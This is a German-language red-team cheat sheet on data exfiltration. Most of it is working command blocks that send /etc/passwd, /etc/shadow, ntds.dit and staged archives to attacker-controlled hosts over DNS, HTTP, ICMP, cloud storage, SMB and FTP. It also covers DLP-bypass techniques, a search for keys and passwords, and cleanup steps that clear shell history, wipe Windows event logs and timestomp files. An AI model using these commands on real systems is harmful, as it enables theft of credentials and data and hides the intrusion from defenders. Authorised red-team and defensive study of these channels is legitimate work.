# Data Exfiltration (Daten-Exfiltration)

> Daten-Exfiltration ist die unautorisierte Übertragung von Daten aus einem Zielnetzwerk. Red Teams testen, welche Kanäle verfügbar sind und ob DLP-Lösungen (Data Loss Prevention) greifen.

## Inhalt

* [MITRE ATT&CK Mapping](#mitre-attck-mapping)
* [Exfiltrations-Kanal-Auswahl](#exfiltrations-kanal-auswahl)
* [DNS-Exfiltration](#dns-exfiltration)
* [HTTP/HTTPS-Exfiltration](#httphttps-exfiltration)
* [ICMP-Exfiltration](#icmp-exfiltration)
* [Cloud-Storage-Exfiltration](#cloud-storage-exfiltration)
* [Protokoll-basierte Exfiltration](#protokoll-basierte-exfiltration)
* [Covert Channels](#covert-channels)
* [Erkennungs-Techniken & DLP-Bypass](#erkennungs-techniken--dlp-bypass)

---

## MITRE ATT&CK Mapping

| Technik | MITRE ID | Beschreibung |
|---------|----------|--------------|
| Exfiltration Over C2 Channel | T1041 | Daten über C2-Verbindung senden |
| Exfiltration Over Web Service | T1567 | Cloud Storage (S3, OneDrive) |
| Exfiltration Over DNS | T1048.003 | DNS-Tunneling |
| Exfiltration Over ICMP | T1048.002 | ICMP Covert Channel |
| Exfiltration Over Unencrypted Protocol | T1048.003 | HTTP, FTP |
| Automated Exfiltration | T1020 | Skript-basierte automatische Exfiltration |
| Data Staged | T1074 | Daten vor Exfiltration sammeln |
| Archive Collected Data | T1560 | Komprimierung/Verschlüsselung |

---

## Exfiltrations-Kanal-Auswahl

### Entscheidungsmatrix

```
Ist DNS nach außen erlaubt?
  ├── Ja → dnscat2 / dnsteal (sehr stealth)
  └── Nein ↓

Ist HTTP/HTTPS nach außen erlaubt?
  ├── Ja → exfil-http / curl (schnell, standard)
  └── Nein ↓

Ist ICMP nach außen erlaubt?
  ├── Ja → icmpsh / ptunnel (langsam aber stealth)
  └── Nein ↓

Gibt es Cloud-Services-Zugang (S3, OneDrive)?
  ├── Ja → s3-exfil / rclone (als legitimer Traffic getarnt)
  └── Nein ↓

SMB ins interne Angreifer-System?
  ├── Ja → smbclient / impacket
  └── Nein → Physischer Zugang / Air-Gap-Bypass erforderlich
```

### Bandbreite & Stealth

| Kanal | Bandbreite | Stealth | Firewall-Bypass | DLP-Erkennungsrate |
|-------|------------|---------|-----------------|-------------------|
| DNS | ~1 KB/s | Sehr hoch | Fast immer | Niedrig-Mittel |
| HTTPS (CDN) | Hoch | Hoch | Standard | Niedrig |
| HTTP | Hoch | Mittel | Standard | Mittel-Hoch |
| ICMP | ~100 B/s | Hoch | Oft erlaubt | Niedrig |
| Cloud S3/Azure | Sehr hoch | Sehr hoch | CDN-Traffic | Niedrig |
| SMB | Hoch | Niedrig | Intern oft offen | Mittel |
| FTP | Mittel | Niedrig | Oft blockiert | Hoch |

---

## DNS-Exfiltration

### Funktionsweise

DNS-Exfiltration kodiert Daten in DNS-Hostnamen. Da DNS-Anfragen durch fast jede Firewall erlaubt sind, ist dies einer der stealthigsten Kanäle.

```
Zielsystem → DNS Query: <base64_data>.exfil.attacker.com
                                          ↓
                              DNS-Server (attacker.com) empfängt Query
                              Daten aus Subdomains rekonstruieren
```

### dnscat2 (empfohlen – bidirektionaler Kanal)

```bash
# === ANGREIFER-SEITE ===

# Mit eigener Domain (Produktions-Setup)
# Voraussetzung: NS-Record von exfil.attacker.com zeigt auf Angreifer-IP
ruby dnscat2.rb --dns domain=exfil.attacker.com --secret mysecret --no-cache

# Direkter Modus (ohne eigene Domain, für Tests)
ruby dnscat2.rb --secret mysecret --dns server=<attacker_ip>,port=53

# Nach Verbindung des Clients
dnscat2> sessions                     # Sessions anzeigen
dnscat2> session -i 1                 # Session auswählen
dnscat2> shell                        # Shell öffnen
dnscat2> download /etc/passwd /tmp/   # Datei exfiltrieren
dnscat2> upload /tmp/tools/nc /tmp/   # Tool deployen

# === ZIEL-SEITE ===

# Linux Client
./dnscat --secret mysecret exfil.attacker.com

# Windows PowerShell Client
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSServer attacker.com -Domain exfil.attacker.com -PreSharedSecret mysecret -Exec cmd

# Windows Binary
dnscat2.exe --secret mysecret exfil.attacker.com
```

### DNSteal (einfache Datei-Exfiltration)

```bash
# === ANGREIFER ===
python3 dnsteal.py attacker.com -v

# === ZIEL (Linux Bash) ===
# Datei in DNS-Queries kodieren und senden
filename="passwd"
data=$(base64 -w 0 /etc/passwd)
chunks=$(echo "$data" | fold -w 60)
echo "$chunks" | while read chunk; do
    dig "${chunk}.${filename}.attacker.com" @attacker.com +short 2>/dev/null
    sleep 0.05
done
```

### DNS-Exfiltration Optimierung

```bash
# Größere Chunks (weniger Queries, schneller)
# Max. DNS-Label-Länge: 63 Zeichen
# Max. DNS-Name: 253 Zeichen → max ~240 Base64-Bytes pro Query

# Mehrere Subdomains für parallele Exfiltration
# <index>.<total>.<data>.exfil.attacker.com

# Kompression vor Base64-Kodierung
gzip -c /etc/passwd | base64 | fold -w 60 | while read chunk; do
    dig "${chunk}.file.attacker.com" @attacker.com +short 2>/dev/null
    sleep 0.1
done
```

---

## HTTP/HTTPS-Exfiltration

### exfil-http (Tool)

```bash
# Empfangsserver starten
exfil-http server 8080
# Dateien landen in /tmp/exfil_*

# Datei via POST senden
exfil-http send_file /etc/passwd http://attacker.com:8080/collect
exfil-http send_file /tmp/ntds.dit https://attacker.com/api/v1/update

# Chunked-Exfiltration (stealthier, kleine GET-Requests)
exfil-http send_chunks /etc/shadow http://attacker.com:8080/img

# HTTPS für verschlüsselten Transfer
exfil-http send_file /home/user/sensitive.zip https://attacker.com:443/telemetry
```

### Manuelle HTTP-Exfiltration

```bash
# POST mit JSON (getarnt als API-Call)
curl -s -X POST "https://attacker.com/api/data" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer legittoken123" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -d "{\"event\":\"$(base64 -w 0 /etc/passwd)\"}"

# GET mit URL-Parameter (Web Analytics Tarnung)
curl -s "https://attacker.com/collect.gif?v=$(hostname | base64)&t=$(date +%s)&d=$(cat /etc/passwd | gzip | base64 -w 0 | head -c 400)"

# Multipart Form Upload
curl -s -X POST https://attacker.com/upload \
  -F "file=@/etc/shadow" \
  -H "User-Agent: Mozilla/5.0"

# Chunked Transfer-Encoding (DLP-Bypass)
cat /etc/passwd | split -b 512 - /tmp/chunk_
for f in /tmp/chunk_*; do
  curl -s -X POST https://attacker.com/stream \
    -H "X-Chunk: $(basename $f)" \
    --data-binary @"$f"
  sleep 0.5
done
```

### HTTPS vs. TLS-Inspection DLP-Bypass

```bash
# Domain Fronting (CDN als Tarnung)
# Traffic geht an CDN (z.B. CloudFlare) → CDN routet zu C2-Server
# Host-Header: legitime CDN-Domain
# Tatsächlicher Ziel-Header: C2-Backend

curl -s https://cdn.cloudflare.com/api/collect \
  -H "Host: attacker-c2.cloudflare.com" \
  -d "$(base64 /etc/passwd)"
```

---

## ICMP-Exfiltration

### icmpsh (Reverse Shell via ICMP)

```bash
# === ANGREIFER ===
# ICMP-Echo-Antworten unterdrücken (wichtig!)
sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Listener starten
python3 icmpsh_m.py <attacker_ip> <target_ip>

# === ZIEL (Windows) ===
icmpsh.exe -t <attacker_ip> -d 500 -b 30 -s 128

# === CLEANUP (Angreifer) ===
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

### Manuelle ICMP-Exfiltration

```bash
# Daten in ICMP-Payload via ping (-p = Payload in Hex)
data=$(cat /etc/passwd | gzip | base64 | tr -d '\n')
echo "$data" | fold -w 16 | while read chunk; do
    hex=$(echo -n "$chunk" | xxd -p | tr -d '\n' | head -c 32)
    ping -p "$hex" -c 1 -q attacker.com > /dev/null 2>&1
    sleep 0.3
done

# ptunnel – Vollständiger TCP-Tunnel über ICMP
# Server (Angreifer)
ptunnel -noprint

# Client (Ziel)
ptunnel -p attacker.com -lp 8080 -da 127.0.0.1 -dp 22

# SSH-Verbindung durch ICMP-Tunnel
ssh -p 8080 user@127.0.0.1
```

---

## Cloud-Storage-Exfiltration

### AWS S3

```bash
# Mit gestohlenen Credentials
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...

# Einzelne Datei
aws s3 cp /tmp/ntds.dit s3://attacker-bucket/exfil/
aws s3 cp /etc/shadow s3://attacker-bucket/linux/shadow

# Ganzes Verzeichnis
aws s3 sync /home/ s3://attacker-bucket/home/ --exclude "*.mp4"

# Via s3-exfil Tool
s3-exfil s3_upload /tmp/dump.zip s3://attacker-bucket/dump.zip
s3-exfil s3_sync /tmp/sensitive/ s3://attacker-bucket/data/

# Mit Victim-Credentials (gestohlene AWS-Keys der Opfer-Org)
AWS_ACCESS_KEY_ID=<victim_key> AWS_SECRET_ACCESS_KEY=<victim_secret> \
  aws s3 cp /tmp/data.zip s3://legitimate-victim-bucket/backup/
```

### Azure Blob Storage

```bash
# Via SAS-Token
az storage blob upload \
  --account-name corpstorageabc \
  --container-name backups \
  --file /tmp/exfil.zip \
  --name exfil_$(date +%Y%m%d).zip \
  --sas-token "?sv=..."

# Via Service Principal
az login --service-principal -u <app-id> -p <password> --tenant <tenant-id>
s3-exfil azure_upload /tmp/sensitive.zip backups sensitive.zip
```

### rclone (Universal Cloud Tool)

```bash
# Konfiguration (viele Providers: S3, Azure, GCS, Dropbox, OneDrive, etc.)
rclone config

# Dateien zu Cloud kopieren
rclone copy /tmp/sensitive/ remote:attacker-bucket/exfil/ --progress

# Kompression on-the-fly
rclone copy /sensitive/data/ remote:bucket/ --transfers 4 \
  --s3-upload-compression gzip
```

---

## Protokoll-basierte Exfiltration

### SMB-Exfiltration

```bash
# Angreifer-SMB-Server (impacket)
python3 smbserver.py exfil /tmp/exfil_receive -smb2support

# Zielsystem – Dateien kopieren
# Windows: copy C:\sensitive\* \\attacker.com\exfil\
# Linux: smbclient //attacker.com/exfil -U user%pass -c "put /etc/passwd passwd"

python3 smbclient.py attacker.com/share -U user%pass
# put /tmp/dump.zip dump.zip
```

### FTP-Exfiltration

```bash
# FTP-Server starten (Python)
python3 -m pyftpdlib -p 2121 -w -d /tmp/ftp_receive

# Ziel – automatischer FTP-Upload
curl -T /etc/passwd ftp://attacker.com:2121/passwd --user anon:anon
ftp attacker.com 2121 << EOF
put /etc/passwd
quit
EOF
```

---

## Covert Channels

### Steganographie (Bild-Exfiltration)

```bash
# Daten in JPG verstecken (steghide)
steghide embed -cf legit-photo.jpg -sf /tmp/secrets.txt -p exfilpass123

# Verstecktes Bild via normalem HTTP hochladen
curl -X POST https://image-sharing-site.com/upload -F "image=@legit-photo.jpg"

# Zsteg – PNG Steganographie
zsteg -a cover.png   # Versteckte Daten suchen

# Prüfen ob Daten erkannt wurden
steghide extract -sf legit-photo.jpg -p exfilpass123
```

### Timing-basierte Kanäle

```bash
# Binary-Exfiltration via Netzwerk-Timing (sehr langsam, extrem stealth)
# 1 = Packet senden, 0 = kurze Pause

data=$(xxd -p /etc/hostname | tr -d '\n')
for bit in $(echo "$data" | fold -w 1); do
    if [ "$bit" = "1" ]; then
        ping -c 1 -q attacker.com > /dev/null 2>&1
    fi
    sleep 0.5
done
```

---

## Erkennungs-Techniken & DLP-Bypass

### Typische DLP-Erkennungs-Methoden

| Methode | Erkennt | Bypass-Technik |
|---------|---------|----------------|
| Signatur-basiert | Bekannte Exfil-Tools | Custom-Tools verwenden |
| Volume-basiert | Große Transfers | Chunking, Rate-Limiting |
| Port-basiert | Uncommon Ports | Port 80/443/53 verwenden |
| Content-Inspektion | Klartextdaten | Verschlüsselung + Base64 |
| TLS-Inspection | HTTPS-Traffic | Domain Fronting, CDN |
| Verhalten-basiert | Anomales Pattern | Timing, normale Business-Hours |

### DLP-Bypass-Techniken

```bash
# 1. Kompression + Verschlüsselung vor Exfiltration
tar czf - /tmp/sensitive/ | openssl enc -aes-256-cbc -k secretkey | base64 > /tmp/exfil.b64
exfil-http send_file /tmp/exfil.b64 https://attacker.com/api/collect

# 2. Daten als legitime Datei tarnen
# Bild-Header voranstellen
printf '\xFF\xD8\xFF' > /tmp/fake.jpg
cat /tmp/secrets.zip >> /tmp/fake.jpg

# 3. Rate-Limiting (DLP-Volumen-Alarm umgehen)
# Max 1 MB/Stunde statt 100 MB in einem Transfer

# 4. Zeitliches Targeting (Business-Hours-Muster)
# Transfer zwischen 9-17 Uhr = normaler Business-Traffic

# 5. User-Agent und Header-Mimikry
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
     -H "Referer: https://www.google.com" \
     -H "Accept-Language: de-DE,de;q=0.9" \
     -X POST https://attacker.com/collect -d "$(base64 /etc/passwd)"
```

---

## Vorbereitung & Cleanup

### Pre-Exfiltration Checkliste

```bash
# Zu exfiltrierende Daten identifizieren und priorisieren
# Windows
dir /s /b C:\Users\*password* C:\Users\*secret* C:\Users\*.pem C:\Users\*.key 2>nul
findstr /s /i /m "password" C:\Users\*.txt C:\Users\*.cfg C:\Users\*.ini

# Linux
find / -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name ".env" 2>/dev/null
find / -name "*.cfg" -o -name "*.conf" 2>/dev/null | xargs grep -l "password\|secret\|token" 2>/dev/null

# Staging: Daten vorbereiten
tar czf /tmp/.update.tgz /home/user/.ssh/ /etc/passwd /etc/shadow
openssl enc -aes-256-cbc -pbkdf2 -in /tmp/.update.tgz -out /tmp/.cache.bin -k 'exfilpass'
```

### Post-Exfiltration Cleanup

```bash
# Staging-Dateien löschen
rm -f /tmp/.update.tgz /tmp/.cache.bin /tmp/exfil* /tmp/chunk_*

# Bash-History löschen
unset HISTFILE
history -c
cat /dev/null > ~/.bash_history

# Windows: Ereignislog (wenn berechtigt)
wevtutil cl System
wevtutil cl Security

# Timestomping (Zugriffs-/Änderungs-Zeit normalisieren)
touch -r /bin/ls /tmp/staged_file  # Zeit von legitimer Datei übernehmen
```

---

## Referenzen

- MITRE ATT&CK Exfiltration: https://attack.mitre.org/tactics/TA0010/
- dnscat2: https://github.com/iagox86/dnscat2
- DNSteal: https://github.com/m57/dnsteal
- icmpsh: https://github.com/bdamele/icmpsh
- rclone: https://rclone.org/
- Data Exfiltration Techniques: https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
